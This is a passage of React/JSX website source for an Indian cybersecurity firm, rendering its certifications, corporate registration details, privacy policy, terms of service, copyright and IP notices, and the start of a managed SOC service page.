                {/* Certifications & Compliance */}
                <div className="space-y-4">
                  <h2 className="text-sm font-bold text-white uppercase tracking-widest border-b border-slate-800 pb-3">Certifications & Compliance Framework</h2>
                  <div className="flex flex-wrap gap-3">
                    {[
                      { label: "ISO/IEC 27001:2022", color: "text-cyan-400 bg-cyan-950/40 border-cyan-900/40" },
                      { label: "SOC 2 Type II", color: "text-emerald-400 bg-emerald-950/40 border-emerald-900/40" },
                      { label: "GDPR Compliant", color: "text-sky-400 bg-sky-950/40 border-sky-900/40" },
                      { label: "PCI-DSS v4.0", color: "text-violet-400 bg-violet-950/40 border-violet-900/40" },
                      { label: "India DPDP Act 2023", color: "text-amber-400 bg-amber-950/40 border-amber-900/40" },
                      { label: "MITRE ATT&CK Mapped", color: "text-red-400 bg-red-950/40 border-red-900/40" },
                      { label: "OWASP LLM Top 10", color: "text-pink-400 bg-pink-950/40 border-pink-900/40" },
                      { label: "NIST CSF 2.0", color: "text-slate-300 bg-slate-800/60 border-slate-700/40" },
                      { label: "CERT-In Notified", color: "text-orange-400 bg-orange-950/40 border-orange-900/40" },
                    ].map(b => (
                      <span key={b.label} className={`text-[11px] font-mono font-semibold px-3 py-1.5 rounded-lg border ${b.color}`}>{b.label}</span>
                    ))}
                  </div>
                </div>

                {/* Corporate Identity */}
                <div className="bg-slate-900/50 border border-slate-800 rounded-xl p-6 space-y-3">
                  <h3 className="text-sm font-bold text-white mb-4 uppercase tracking-widest">Corporate Registration & Identity</h3>
                  {[
                    ["Legal Name", "CYBERDUDEBIVASH PRIVATE LIMITED"],
                    ["Brand", "CyberDudeBivash®"],
                    ["Incorporation", "Companies Act 2013, Republic of India"],
                    ["PAN", "ARKPN8270G"],
                    ["GSTIN", "21ARKPN8270G1ZP"],
                    ["Registered Address", "29, Korai-Sukinda Rd, Ragadi, JAJPUR ROAD, Odisha 755019, India"],
                    ["Operational Email", "bivash@cyberdudebivash.com"],
                    ["Enterprise Hotline", "+91 81798 81447"],
                    ["Business Hours", "Monday–Saturday, 9:00 AM – 7:00 PM IST"],
                    ["Jurisdiction", "Odisha High Court, India"],
                  ].map(([k, v]) => (
                    <div key={k} className="flex gap-4 text-xs font-mono border-b border-slate-800/40 pb-2 last:border-0 last:pb-0">
                      <span className="text-slate-500 w-36 shrink-0">{k}</span>
                      <span className="text-slate-200">{v}</span>
                    </div>
                  ))}
                </div>

                {/* CTA */}
                <div className="bg-gradient-to-r from-cyan-950/30 to-slate-900/60 border border-cyan-800/30 rounded-xl p-6 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
                  <div>
                    <h3 className="text-sm font-bold text-white mb-1">Ready to secure your enterprise?</h3>
                    <p className="text-xs text-slate-400 font-sans">Contact our security coordinators for a free assessment and platform demo.</p>
                  </div>
                  <button
                    onClick={() => setShowContactModal(true)}
                    className="shrink-0 px-6 py-2.5 bg-cyan-500 hover:bg-cyan-400 text-black text-xs font-extrabold rounded-lg uppercase tracking-wider transition-colors"
                  >
                    Request Enterprise Demo
                  </button>
                </div>
              </div>
            )}

            {/* ===== PRIVACY POLICY ===== */}
            {currentView === "privacy" && (
              <div className="space-y-10">
                <div>
                  <div className="text-[10px] font-mono text-emerald-500 uppercase tracking-widest mb-3 flex items-center gap-2">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-500" /> Legal Document
                  </div>
                  <h1 className="text-3xl md:text-4xl font-extrabold text-white mb-3 leading-tight">Privacy Policy</h1>
                  <div className="flex flex-wrap gap-3 text-[10px] font-mono">
                    <span className="bg-emerald-950/40 text-emerald-400 border border-emerald-900/40 px-2.5 py-1 rounded">Last updated: June 2026</span>
                    <span className="bg-slate-900 text-slate-400 border border-slate-800 px-2.5 py-1 rounded">DPDP Act 2023 Compliant</span>
                    <span className="bg-slate-900 text-slate-400 border border-slate-800 px-2.5 py-1 rounded">GDPR Compliant</span>
                    <span className="bg-slate-900 text-slate-400 border border-slate-800 px-2.5 py-1 rounded">Effective Immediately</span>
                  </div>
                </div>

                <div className="bg-emerald-950/20 border border-emerald-800/30 rounded-xl p-5">
                  <p className="text-xs text-slate-300 leading-relaxed font-sans">
                    This Privacy Policy describes how <strong className="text-white">CYBERDUDEBIVASH PRIVATE LIMITED</strong> ("CyberDudeBivash", "we", "our", "us") collects, uses, stores, and protects personal data in accordance with the <strong className="text-emerald-400">Digital Personal Data Protection Act 2023 (India)</strong>, the <strong className="text-sky-400">General Data Protection Regulation (EU) 2016/679</strong>, the Information Technology Act 2000, and applicable CERT-In guidelines.
                  </p>
                </div>

                {[
                  {
                    num: "01", title: "Data Controller / Data Fiduciary", color: "border-emerald-500/50",
                    body: "CYBERDUDEBIVASH PRIVATE LIMITED is the Data Fiduciary under India's DPDP Act 2023 and the Data Controller under GDPR for all personal data processed through our platforms, tools, APIs, and services. Our designated Data Protection Officer (DPO) is Bivasha Kumar Nayak, reachable at bivash@cyberdudebivash.com.",
                  },
                  {
                    num: "02", title: "Personal Data We Collect", color: "border-sky-500/50",
                    body: "We collect: (a) Identity data — full name, email address, phone number, company name when submitted via enterprise inquiry forms; (b) Usage analytics — page views, session duration, browser type, anonymized IP geolocation via privacy-respecting first-party analytics; (c) API access metadata — endpoint calls, rate limit counters, API key hashes for billing and abuse prevention; (d) Security telemetry — from opted-in managed SOC deployments under a signed Data Processing Agreement (DPA). We do NOT collect sensitive personal data (caste, religion, health, biometrics) without explicit written consent.",
                  },
                  {
                    num: "03", title: "Purpose of Processing", color: "border-cyan-500/50",
                    body: "Your personal data is processed exclusively for: delivering requested cybersecurity products and managed services; responding to enterprise inquiries within 1 business day; platform performance monitoring and improvement; compliance audit logging required by ISO 27001 and SOC 2 Type II certifications; sending transactional communications (invoices, SLA reports, security advisories) related to subscribed services. We do NOT sell, rent, or share personal data with third-party advertisers.",
                  },
                  {
                    num: "04", title: "Data Localisation (DPDP Act 2023)", color: "border-amber-500/50",
                    body: "Pursuant to Section 16 of the DPDP Act 2023 and MeitY guidelines, all personal data of Indian residents (Data Principals) is stored exclusively on servers physically located within the Republic of India (our primary data center: Odisha, India). Cross-border data transfers — where operationally required — are conducted only to jurisdictions approved under DPDP Act schedules, under Standard Contractual Clauses (SCCs) or equivalent mechanisms.",
                  },
                  {
                    num: "05", title: "Your Rights as a Data Principal", color: "border-violet-500/50",
                    body: "Under the DPDP Act 2023 and GDPR, you have the right to: (a) Access a summary of your personal data we hold; (b) Correct inaccurate or incomplete data; (c) Erasure ('Right to be forgotten') of your data upon request, subject to legal retention obligations; (d) Withdraw consent at any time without affecting prior processing; (e) Nominate a successor for your data upon death (DPDP-specific); (f) Grievance redressal within 30 days of complaint. Submit all data rights requests to: bivash@cyberdudebivash.com with subject 'Data Rights Request'.",
                  },
                  {
                    num: "06", title: "Data Retention", color: "border-slate-500/50",
                    body: "Contact and inquiry data: retained for 36 months from last interaction, then securely deleted. API usage logs: 12 months for billing/audit, then purged. Managed SOC telemetry: per DPA terms, typically 24 months. We apply data minimization — we do not retain data longer than necessary for the stated purpose.",
                  },
                  {
                    num: "07", title: "Security Measures", color: "border-red-500/50",
                    body: "We implement enterprise-grade security controls: AES-256 encryption at rest; TLS 1.3 for data in transit; SOC 2 Type II certified infrastructure; role-based access controls (RBAC); multi-factor authentication on all administrative access; regular penetration testing of our own systems; and CERT-In-compliant incident response procedures.",
                  },
                  {
                    num: "08", title: "Personal Data Breach Notification", color: "border-orange-500/50",
                    body: "In the event of a personal data breach materially affecting your data, CYBERDUDEBIVASH will: (1) Notify the Data Protection Board of India within 6 hours of becoming aware as per CERT-In Directions 2022; (2) Notify affected Data Principals within 72 hours; (3) Provide a detailed breach report including nature of breach, categories of data affected, and remediation measures taken.",
                  },
                  {
                    num: "09", title: "Cookies & Tracking Technologies", color: "border-pink-500/50",
                    body: "We use strictly necessary session cookies for platform security and authentication. Analytics cookies (Google Analytics 4) are used only with your explicit consent granted via our Cookie Consent banner. We do NOT use third-party advertising or cross-site tracking cookies. Cookie consent can be withdrawn at any time via browser settings — this does not affect platform security functionality.",
                  },
                  {
                    num: "10", title: "Third-Party Services", color: "border-slate-600/50",
                    body: "We use Google Analytics 4 (with IP anonymization enabled) for platform analytics, and Google AdSense for contextual advertising (consent-gated). We do not share personal data with these services beyond what is strictly necessary for service delivery. All third-party processors are bound by Data Processing Agreements.",
                  },
                  {
                    num: "11", title: "Children's Privacy", color: "border-slate-600/50",
                    body: "Our platforms are designed for enterprise security professionals (18+). We do not knowingly collect personal data from individuals under 18 years of age. If you believe a minor has submitted data to us, contact our DPO immediately for deletion.",
                  },
                  {
                    num: "12", title: "Contact & Grievance Redressal", color: "border-emerald-500/50",
                    body: "Data Protection Officer: Bivasha Kumar Nayak | Email: bivash@cyberdudebivash.com | Phone: +91 81798 81447 | Address: CYBERDUDEBIVASH PRIVATE LIMITED, 29 Korai-Sukinda Rd, Ragadi, Jajpur Road, Odisha 755019, India. For unresolved grievances, you may escalate to the Data Protection Board of India (once constituted under DPDP Act 2023).",
                  },
                ].map(s => (
                  <div key={s.num} className={`border-l-2 ${s.color} pl-5 space-y-1.5`}>
                    <div className="text-[9px] font-mono text-slate-600 uppercase">Section {s.num}</div>
                    <h3 className="text-sm font-bold text-slate-100">{s.title}</h3>
                    <p className="text-xs text-slate-400 leading-relaxed font-sans">{s.body}</p>
                  </div>
                ))}
              </div>
            )}

            {/* ===== TERMS OF SERVICE ===== */}
            {currentView === "terms" && (
              <div className="space-y-10">
                <div>
                  <div className="text-[10px] font-mono text-violet-400 uppercase tracking-widest mb-3 flex items-center gap-2">
                    <span className="w-1.5 h-1.5 rounded-full bg-violet-400" /> Legal Document
                  </div>
                  <h1 className="text-3xl md:text-4xl font-extrabold text-white mb-3 leading-tight">Terms of Service</h1>
                  <div className="flex flex-wrap gap-3 text-[10px] font-mono">
                    <span className="bg-violet-950/40 text-violet-400 border border-violet-900/40 px-2.5 py-1 rounded">Last updated: June 2026</span>
                    <span className="bg-slate-900 text-slate-400 border border-slate-800 px-2.5 py-1 rounded">Governing Law: India</span>
                    <span className="bg-slate-900 text-slate-400 border border-slate-800 px-2.5 py-1 rounded">IT Act 2000</span>
                    <span className="bg-slate-900 text-slate-400 border border-slate-800 px-2.5 py-1 rounded">Companies Act 2013</span>
                  </div>
                </div>

                <div className="bg-violet-950/20 border border-violet-800/30 rounded-xl p-5">
                  <p className="text-xs text-slate-300 leading-relaxed font-sans">
                    These Terms of Service ("Terms") constitute a legally binding agreement between you ("User", "Client", "you") and <strong className="text-white">CYBERDUDEBIVASH PRIVATE LIMITED</strong> ("CyberDudeBivash", "we", "us") governing your access to and use of all platforms, tools, APIs, documentation, and services operated under the CYBERDUDEBIVASH® brand. By accessing or using any CYBERDUDEBIVASH service, you affirm that you have read, understood, and agree to be bound by these Terms.
                  </p>
                </div>

                {[
                  {
                    num: "01", title: "Acceptance of Terms", color: "border-violet-500/50",
                    body: "By accessing any CYBERDUDEBIVASH platform, tool, API, or documentation, you agree to be bound by these Terms of Service, our Privacy Policy, and any additional guidelines applicable to specific services. If you access our services on behalf of an organization, you represent that you have authority to bind that organization to these Terms. If you do not agree, you must immediately discontinue use of all CYBERDUDEBIVASH services.",
                  },
                  {
                    num: "02", title: "Authorized Use & Prohibited Activities", color: "border-red-500/50",
                    body: "Our platforms are authorized exclusively for: legitimate cybersecurity defense operations, threat intelligence consumption, compliance monitoring, security research, and educational purposes within your own organization or authorized client environments. STRICTLY PROHIBITED: (a) Using our tools or intelligence against third-party systems without explicit written authorization from the target organization; (b) Any activity constituting unauthorized access under IT Act 2000 Sections 43, 66, 66B, 66C; (c) Reverse engineering, decompiling, or creating derivative works from our proprietary platform; (d) Reselling, sublicensing, or white-labeling our tools without a written Partner Agreement; (e) Uploading malware, exploit code, or harmful payloads to any CYBERDUDEBIVASH infrastructure. Violations will be reported to CERT-In, law enforcement, and may result in immediate account termination and legal action.",
                  },
                  {
                    num: "03", title: "Intellectual Property Rights", color: "border-cyan-500/50",
                    body: "All content, software code, brand names (CyberDudeBivash®, Sentinel APEX™, ThreatCore™, GE-Neural Architecture™), logos, threat intelligence reports, SIGMA detection rules, incident response playbooks, AI model weights, API schemas, and documentation are the exclusive intellectual property of CYBERDUDEBIVASH PRIVATE LIMITED, protected under: the Copyright Act 1957 (India); the Trade Marks Act 1999 (India); the Patents Act 1970 (India); and the Berne Convention for international protection. No license to our IP is granted beyond what is explicitly stated in your subscription agreement.",
                  },
                  {
                    num: "04", title: "Platform Access & Subscription Tiers", color: "border-sky-500/50",
                    body: "Platform access is provided under tiered subscription plans: Free Tier (public threat feeds, limited API calls), Professional Tier (extended API access, SIGMA rules, compliance reports), and Enterprise Tier (managed SOC, dedicated support, SLA guarantees, custom integrations). Subscription fees are non-refundable after the 7-day evaluation period unless the platform is materially non-functional due to our fault.",
                  },
                  {
                    num: "05", title: "API Usage Terms", color: "border-amber-500/50",
                    body: "API access is subject to rate limits defined in your subscription tier (Free: 100 calls/day; Professional: 10,000 calls/day; Enterprise: unlimited under fair use). Prohibited API uses: credential sharing between organizations; automated scraping of threat database beyond licensed volume; building competing intelligence products using our API data; exfiltrating our IOC database. Rate limit violations will trigger automatic suspension. Continued abuse will result in permanent ban and legal action for breach of contract.",
                  },
                  {
                    num: "06", title: "Security Research & Responsible Disclosure", color: "border-emerald-500/50",
                    body: "We actively support the global security research community. Security researchers discovering vulnerabilities in our platforms must: (1) Report exclusively via bivash@cyberdudebivash.com with subject 'Security Vulnerability Report'; (2) Provide detailed reproduction steps, impact assessment, and suggested mitigations; (3) Allow a 90-day coordinated disclosure timeline before public disclosure. We commit to: acknowledging receipt within 24 hours; providing updates every 14 days; crediting researchers in our security advisories (with their consent). We explicitly DO NOT authorize unauthorized penetration testing of CYBERDUDEBIVASH production systems.",
                  },
                  {
                    num: "07", title: "Data Processing & Managed SOC Services", color: "border-pink-500/50",
                    body: "Enterprise clients engaging Managed SOC-as-a-Service must execute a Data Processing Agreement (DPA) prior to service activation. Under the DPA: CYBERDUDEBIVASH processes your security telemetry solely for threat detection and incident response; we do not use your security data for product development, training AI models, or sharing with third parties; your security data is segregated in dedicated tenants; you retain full ownership of all security data at all times.",
                  },
                  {
                    num: "08", title: "Service Availability & SLA", color: "border-slate-500/50",
                    body: "We target 99.9% uptime for Professional and Enterprise tier services, measured monthly excluding scheduled maintenance windows (communicated 72 hours in advance via status.cyberdudebivash.com). In the event of SLA breach below 99.5% in a calendar month, Enterprise clients are eligible for service credits of 10% per each 0.1% below the SLA floor, up to 30% of monthly fees. Free Tier services are provided without SLA guarantees.",
                  },
                  {
                    num: "09", title: "Limitation of Liability", color: "border-orange-500/50",
                    body: "CyberDudeBivash provides threat intelligence, security tooling, and SOC services on a best-effort basis. We are not liable for: (a) security breaches that occur despite our services being deployed; (b) decisions made by your team based on our threat intelligence outputs; (c) third-party service outages affecting platform availability; (d) losses arising from unforeseeable or extraordinary events (force majeure). Maximum aggregate liability shall not exceed the total fees paid to CYBERDUDEBIVASH in the 3 calendar months immediately preceding the claim.",
                  },
                  {
                    num: "10", title: "Indemnification", color: "border-red-500/50",
                    body: "You agree to indemnify, defend, and hold harmless CYBERDUDEBIVASH PRIVATE LIMITED, its directors, officers, employees, and contractors from and against any claims, liabilities, damages, losses, and expenses (including reasonable legal fees) arising from: your violation of these Terms; your unauthorized use of our platforms; your use of our services in violation of applicable law; or any third-party claims resulting from your security operations conducted using our tools.",
                  },
                  {
                    num: "11", title: "Modifications to Terms", color: "border-slate-600/50",
                    body: "We reserve the right to modify these Terms at any time. Material changes will be communicated via email to registered users and displayed as a banner on the platform with a minimum 30-day notice period before taking effect. Continued use of CYBERDUDEBIVASH services after the effective date constitutes acceptance of the revised Terms.",
                  },
                  {
                    num: "12", title: "Governing Law & Dispute Resolution", color: "border-violet-500/50",
                    body: "These Terms are governed exclusively by the laws of the Republic of India. Any dispute, controversy, or claim arising out of or relating to these Terms or services shall be: (1) first submitted to good-faith negotiation between the parties for 30 days; (2) if unresolved, referred to binding arbitration under the Arbitration and Conciliation Act 1996 (India), with the seat of arbitration at Bhubaneswar, Odisha; (3) conducted in English before a sole arbitrator appointed by mutual agreement. Nothing in this clause prevents either party from seeking urgent injunctive relief from Indian courts.",
                  },
                ].map(s => (
                  <div key={s.num} className={`border-l-2 ${s.color} pl-5 space-y-1.5`}>
                    <div className="text-[9px] font-mono text-slate-600 uppercase">Section {s.num}</div>
                    <h3 className="text-sm font-bold text-slate-100">{s.title}</h3>
                    <p className="text-xs text-slate-400 leading-relaxed font-sans">{s.body}</p>
                  </div>
                ))}
              </div>
            )}

            {/* ===== COPYRIGHT & IP ===== */}
            {currentView === "copyright" && (
              <div className="space-y-10">
                <div>
                  <div className="text-[10px] font-mono text-amber-400 uppercase tracking-widest mb-3 flex items-center gap-2">
                    <span className="w-1.5 h-1.5 rounded-full bg-amber-400" /> Legal Document
                  </div>
                  <h1 className="text-3xl md:text-4xl font-extrabold text-white mb-3 leading-tight">Copyright &amp; Intellectual Property</h1>
                  <p className="text-xs text-slate-500 font-mono">&copy; {new Date().getFullYear()} CYBERDUDEBIVASH PRIVATE LIMITED. All rights reserved worldwide.</p>
                </div>

                <div className="bg-amber-950/20 border border-amber-800/30 rounded-xl p-6 space-y-3">
                  <h3 className="text-sm font-bold text-amber-400">Comprehensive Copyright Notice</h3>
                  <p className="text-xs text-slate-300 leading-relaxed font-sans">
                    All content, software, source code, binary executables, AI model weights, SIGMA detection rules, incident response playbooks, threat intelligence feeds, CVE databases, API schemas, documentation, graphics, multimedia assets, brand elements, domain names, and other materials published across the entire CYBERDUDEBIVASH ecosystem are the exclusive intellectual property of <strong className="text-white">CYBERDUDEBIVASH PRIVATE LIMITED</strong>. All rights reserved under the <strong className="text-amber-400">Copyright Act, 1957 (India)</strong>, the Berne Convention for the Protection of Literary and Artistic Works, and applicable international copyright treaties.
                  </p>
                </div>

                {/* Trademark registry */}
                <div className="space-y-4">
                  <h2 className="text-sm font-bold text-white uppercase tracking-widest border-b border-slate-800 pb-3">Trademark & Brand Registry</h2>
                  <div className="grid md:grid-cols-2 gap-3">
                    {[
                      { mark: "CyberDudeBivash®", type: "Registered Trademark", desc: "Primary corporate brand and platform name. Protected under Trade Marks Act 1999, Class 42 (IT services)." },
                      { mark: "Sentinel APEX™", type: "Common Law Trademark", desc: "Threat intelligence and SOC platform brand. TM protection under use in commerce since 2021." },
                      { mark: "ThreatCore™", type: "Common Law Trademark", desc: "Security toolkits and penetration testing suite brand. Protected since 2022." },
                      { mark: "GE-Neural Architecture™", type: "Common Law Trademark", desc: "Proprietary AI model architecture brand used in CDB's autonomous threat detection engine." },
                      { mark: "CYBERDUDEBIVASH ECOSYSTEM V4", type: "Brand Identity", desc: "Platform suite branding for Version 4 of the unified CYBERDUDEBIVASH security ecosystem." },
                      { mark: "CDB Shield Logo", type: "Artistic Work Copyright", desc: "The CyberDudeBivash shield/logo design is protected as an original artistic work under the Copyright Act 1957." },
                    ].map(m => (
                      <div key={m.mark} className="bg-slate-900/40 border border-slate-800 rounded-lg p-4">
                        <div className="flex items-start justify-between gap-2 mb-1">
                          <h4 className="text-sm font-bold text-amber-400">{m.mark}</h4>
                          <span className="text-[9px] font-mono text-slate-500 bg-slate-800 px-1.5 py-0.5 rounded shrink-0">{m.type}</span>
                        </div>
                        <p className="text-[11px] text-slate-500 leading-relaxed font-sans">{m.desc}</p>
                      </div>
                    ))}
                  </div>
                </div>

                {[
                  {
                    num: "01", title: "Scope of Protection", color: "border-amber-500/50",
                    body: "Copyright protection extends to all original works created by CYBERDUDEBIVASH PRIVATE LIMITED including: platform source code and compiled software; AI threat detection model architectures and trained weights; SIGMA rule sets and threat detection signatures; incident response playbooks and SOC procedures; threat intelligence reports and CVE analyses; API documentation, technical whitepapers, and blog articles; graphic design assets, UI/UX designs, and brand visuals; video content, tutorials, and recorded webinars. Protection subsists automatically upon creation under the Berne Convention without requirement for registration.",
                  },
                  {
                    num: "02", title: "Software License Terms", color: "border-orange-500/50",
                    body: "CYBERDUDEBIVASH platform software is proprietary. Unless explicitly licensed otherwise in a written subscription or API agreement: (a) You may NOT copy, modify, adapt, translate, or create derivative works; (b) You may NOT reverse engineer, decompile, disassemble, or attempt to derive source code; (c) You may NOT distribute, sublicense, lease, rent, loan, or otherwise transfer the software; (d) You may NOT use the software to build competing cybersecurity intelligence products. Security tools sold via Gumroad are licensed for single-organization internal use only and may not be resold, redistributed, or used for client service delivery without a Reseller Agreement.",
                  },
                  {
                    num: "03", title: "SIGMA Rules & Detection Content License", color: "border-yellow-500/50",
                    body: "SIGMA detection rules, YARA signatures, and threat hunting queries produced by CyberDudeBivash are licensed for: (a) PERMITTED — Internal defensive use within your own organization's SIEM/SOAR with attribution; (b) PERMITTED — Academic research with citation 'Source: CyberDudeBivash® (cyberdudebivash.com)'; (c) NOT PERMITTED — Commercial redistribution without a Data Reseller Agreement; (d) NOT PERMITTED — Rebranding or presenting as original work. Public sharing of CDB detection content requires attribution: 'Detection content by CyberDudeBivash® | cyberdudebivash.com'.",
                  },
                  {
                    num: "04", title: "Threat Intelligence Data License", color: "border-emerald-500/50",
                    body: "Threat intelligence data (IOC feeds, CVE enrichments, geolocation threat maps, malware hash databases) delivered via the CyberDudeBivash API is licensed for operational use within your organization only. Permitted uses: feeding your SIEM/SOAR, blocking IOCs in your firewall/EDR, correlating against your log data. Not permitted: bulk export, database mirroring, commercial redistribution, or creating derivative threat intelligence products.",
                  },
                  {
                    num: "05", title: "Permitted Fair Uses", color: "border-sky-500/50",
                    body: "The following uses are expressly permitted without prior written consent: (1) Linking to CYBERDUDEBIVASH public platforms with accurate brand representation; (2) Quoting brief excerpts (under 200 words) in journalistic, academic, or commentary contexts with full attribution; (3) Referencing CYBERDUDEBIVASH in CVE disclosures or security advisories with factual accuracy; (4) Using our public API within licensed call limits; (5) Citing our research in academic papers with proper bibliography entry. All other uses require written permission.",
                  },
                  {
                    num: "06", title: "Press & Media Licensing", color: "border-pink-500/50",
                    body: "Journalists and media organizations may use the CyberDudeBivash® name and factual descriptions of our services in news articles, reviews, and editorial content. For media kits, official logo files, authorized brand assets, and press contact: bivash@cyberdudebivash.com with subject 'Media Inquiry'. We respond to media requests within 2 business days. Unauthorized use of our logo in a way that implies endorsement or partnership is prohibited.",
                  },
                  {
                    num: "07", title: "DMCA & Infringement Reporting", color: "border-red-500/50",
                    body: "To report copyright infringement of CYBERDUDEBIVASH content by third parties, or to submit a DMCA counter-notification: Email: bivash@cyberdudebivash.com | Subject: 'IP Infringement Notice / DMCA' | Include: (1) Description of the copyrighted work infringed; (2) URL/location of the infringing content; (3) Your contact information and sworn statement of good faith belief. We investigate all reports and respond within 5 business days. False DMCA claims may result in liability under 17 U.S.C. § 512(f).",
                  },
                  {
                    num: "08", title: "Recommended Citation Format", color: "border-slate-500/50",
                    body: "When citing CYBERDUDEBIVASH research, threat reports, or security tools in academic or professional publications: CyberDudeBivash® (Year). [Title of Resource/Report]. CYBERDUDEBIVASH PRIVATE LIMITED, Jajpur Road, Odisha, India. Retrieved from: cyberdudebivash.com. For API data citations: 'Threat intelligence data sourced from CyberDudeBivash® Sentinel APEX™ API (cyberdudebivash.com)'.",
                  },
                ].map(s => (
                  <div key={s.num} className={`border-l-2 ${s.color} pl-5 space-y-1.5`}>
                    <div className="text-[9px] font-mono text-slate-600 uppercase">Section {s.num}</div>
                    <h3 className="text-sm font-bold text-slate-100">{s.title}</h3>
                    <p className="text-xs text-slate-400 leading-relaxed font-sans">{s.body}</p>
                  </div>
                ))}

                <div className="bg-slate-900/60 border border-slate-800 rounded-xl p-5 text-center space-y-2">
                  <p className="text-[11px] text-slate-500 font-mono">&copy; {new Date().getFullYear()} CYBERDUDEBIVASH PRIVATE LIMITED. All Rights Reserved.</p>
                  <p className="text-[10px] text-slate-600 font-sans">Registered in India · PAN: ARKPN8270G · GSTIN: 21ARKPN8270G1ZP</p>
                  <p className="text-[10px] text-slate-600 font-sans">29, Korai-Sukinda Rd, Ragadi, Jajpur Road, Odisha 755019, India</p>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* ===== ENTERPRISE SERVICE PAGES ===== */}
      {(currentView === "soc" || currentView === "dpdp" || currentView === "owasp" || currentView === "mssp" || currentView === "vciso" || currentView === "pentest") && (
        <div className="min-h-screen bg-[#030912] border-t border-slate-800/60">
          <div className="h-0.5 w-full bg-gradient-to-r from-transparent via-violet-500/70 to-transparent" />
          <div className="max-w-5xl mx-auto px-6 py-12">
            <button onClick={() => setCurrentView("home")} className="mb-10 text-xs text-slate-500 hover:text-cyan-400 transition-colors flex items-center gap-2 font-mono group">
              <span className="group-hover:-translate-x-1 transition-transform inline-block">←</span> Back to Gateway
            </button>

            {/* ===== MANAGED SOC-AS-A-SERVICE ===== */}
            {currentView === "soc" && (
              <div className="space-y-10">
                <div>
                  <div className="text-[10px] font-mono text-violet-400 uppercase tracking-widest mb-3 flex items-center gap-2">
                    <span className="w-1.5 h-1.5 rounded-full bg-violet-400 animate-pulse" /> Enterprise Service · SOC Operations
                  </div>
                  <h1 className="text-3xl md:text-4xl font-extrabold text-white mb-4 leading-tight">
                    Managed SOC-as-a-Service
                  </h1>
                  <p className="text-slate-300 leading-relaxed text-sm md:text-base font-sans max-w-3xl">
                    CyberDudeBivash® delivers a fully autonomous 24×7 Security Operations Center powered by our GE-Neural AI engine — combining real-time threat detection, automated alert triage, human-expert incident response, and continuous threat hunting into a single managed service that protects your enterprise without the overhead of building an in-house SOC.
                  </p>
                </div>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                  {[
                    { v: "24×7", l: "Continuous Monitoring", c: "text-violet-400" },
                    { v: "<15m", l: "Mean Time to Respond", c: "text-cyan-400" },
                    { v: "99.7%", l: "AI Detection Accuracy", c: "text-emerald-400" },
                    { v: "2,800+", l: "SOC Teams Served", c: "text-amber-400" },
                  ].map(s => (
                    <div key={s.l} className="bg-slate-900/60 border border-slate-800 rounded-xl p-4 text-center">
                      <div className={`text-2xl font-extrabold font-mono ${s.c}`}>{s.v}</div>
                      <div className="text-[10px] text-slate-500 uppercase tracking-widest mt-1">{s.l}</div>
                    </div>
                  ))}
                </div>
                <div className="bg-violet-950/20 border border-violet-800/30 rounded-xl p-6">
                  <h2 className="text-sm font-bold text-violet-300 mb-3 uppercase tracking-widest">What is Managed SOC-as-a-Service?</h2>
                  <p className="text-xs text-slate-300 leading-relaxed font-sans">Our Managed SOC eliminates the need to hire, train, and retain a 20-person security team. Instead, you get the full power of an enterprise SOC — staffed by CyberDudeBivash analysts, augmented by our proprietary GE-Neural AI engine — delivered as a subscription service with predictable monthly pricing, SLA guarantees, and full integration into your existing infrastructure.</p>
                </div>
                <div className="space-y-4">
                  <h2 className="text-sm font-bold text-white uppercase tracking-widest border-b border-slate-800 pb-3">Core SOC Capabilities</h2>
                  <div className="grid md:grid-cols-2 gap-4">
                    {[
                      { title: "AI-Powered Alert Triage", icon: "🧠", desc: "GE-Neural AI processes millions of raw security events per hour, reducing alert noise by 94%. Only true positives reach your dedicated analyst queue — zero alert fatigue." },
                      { title: "24×7 Threat Hunting", icon: "🎯", desc: "Proactive hunting for advanced persistent threats (APTs), living-off-the-land attacks (LotL), and zero-day exploitation attempts across your endpoints, network, and cloud workloads." },
                      { title: "MITRE ATT&CK Mapped Detection", icon: "🗺️", desc: "Every detection rule is mapped to MITRE ATT&CK v14 tactics and techniques. You receive real-time visibility into which attack stages are being blocked and where coverage gaps exist." },
                      { title: "Automated Incident Response", icon: "⚡", desc: "Pre-built SOAR playbooks automatically contain threats — isolating compromised endpoints, blocking malicious IPs, revoking compromised credentials — within minutes of detection." },
                      { title: "SIEM Log Management", icon: "📊", desc: "Ingest, normalize, correlate, and retain logs from 200+ sources: firewalls, EDR, cloud (AWS/Azure/GCP), SaaS applications, identity providers, and custom log pipelines." },
                      { title: "Vulnerability Management", icon: "🔍", desc: "Continuous asset discovery and vulnerability scanning with risk-prioritized remediation guidance aligned to your business impact and exposure window." },
                      { title: "Threat Intelligence Integration", icon: "🌐", desc: "Real-time feed from Sentinel APEX™ — 500K+ IOCs updated every 4 hours — automatically enriching alerts with threat actor context, malware family attribution, and global campaign tracking." },
                      { title: "Compliance Reporting", icon: "📋", desc: "Monthly SOC reports mapped to ISO 27001, SOC 2 Type II, DPDP Act, NIST CSF, and PCI-DSS. Evidence packages ready for auditors and board presentations." },
                    ].map(c => (
                      <div key={c.title} className="bg-slate-900/40 border border-slate-800 rounded-lg p-4 flex gap-3">
                        <span className="text-lg shrink-0">{c.icon}</span>
                        <div>
                          <h4 className="text-xs font-bold text-slate-200 mb-1">{c.title}</h4>
                          <p className="text-[11px] text-slate-500 leading-relaxed font-sans">{c.desc}</p>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
                <div className="space-y-4">
                  <h2 className="text-sm font-bold text-white uppercase tracking-widest border-b border-slate-800 pb-3">SOC Technology Stack</h2>
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                    {["Splunk SIEM", "Microsoft Sentinel", "CrowdStrike EDR", "Palo Alto XSOAR", "Elastic Stack", "AWS GuardDuty", "Azure Defender", "Wazuh HIDS", "Zeek Network Monitor", "MITRE ATT&CK", "SIGMA Rules Engine", "GE-Neural AI v4"].map(t => (
                      <div key={t} className="bg-slate-900/60 border border-slate-800 rounded-lg px-3 py-2 text-[10px] font-mono text-slate-400 text-center">{t}</div>
                    ))}
                  </div>
                </div>
                <div className="space-y-4">
                  <h2 className="text-sm font-bold text-white uppercase tracking-widest border-b border-slate-800 pb-3">Service Tiers</h2>
                  <div className="grid md:grid-cols-3 gap-4">
                    {[
